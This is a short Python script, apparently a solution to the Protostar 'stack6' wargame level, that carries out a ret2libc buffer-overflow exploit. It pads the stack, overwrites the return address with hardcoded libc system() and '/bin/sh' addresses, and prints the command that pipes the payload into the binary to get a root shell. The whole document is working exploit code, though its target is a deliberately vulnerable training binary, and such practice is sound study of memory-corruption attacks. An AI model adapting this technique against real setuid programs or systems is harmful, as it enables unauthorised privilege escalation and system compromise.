# ret2libc exploit
# code to open shell already present in binary --> no need to inject own shell code

import struct

padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" #add 4 bytes to account for unsigned int

system = struct.pack("I", 0xb7ecffb0) #address of system function (able to open /bin/sh)
return_after_system = "AAAA" #return into segmentation fault (could chain into other functions here)
bin_sh = struct.pack("I", 0xb7fb63bf) #address of /bin/sh

file = open("exp", "w")
file.write(padding + system + return_after_system + bin_sh)
file.close()

print "Use following command to open root shell:"
print "(cat exp ; cat) | /opt/protostar/bin/stack6"
print "Then use 'id' or 'whoami' to verify root"
